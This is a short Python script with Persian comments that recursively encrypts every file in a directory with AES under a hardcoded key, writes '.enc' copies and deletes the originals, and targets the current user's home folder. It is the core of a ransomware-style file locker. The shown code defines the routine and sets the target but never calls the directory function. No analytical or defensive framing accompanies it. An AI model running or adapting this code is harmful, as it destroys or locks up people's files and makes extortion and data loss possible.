import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

KEY = b'a3f9b7c8d5e1f2a9c4d8e6f1b7a2c3d4' 		

def encrypt_file(file_path):
    if not os.path.exists(file_path):  # بررسی اینکه فایل وجود دارد
        return  

    cipher = AES.new(KEY, AES.MODE_CBC)

    with open(file_path, "rb") as f:
        plaintext = f.read()

    ciphertext = cipher.iv + cipher.encrypt(pad(plaintext, AES.block_size))

    with open(file_path + ".enc", "wb") as f:
        f.write(ciphertext)

    os.remove(file_path)  # حذف فایل اصلی

def encrypt_directory(directory):
    for root, _, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            encrypt_file(file_path)  # پردازش هر فایل

directory = f"/home/{os.getlogin()}"
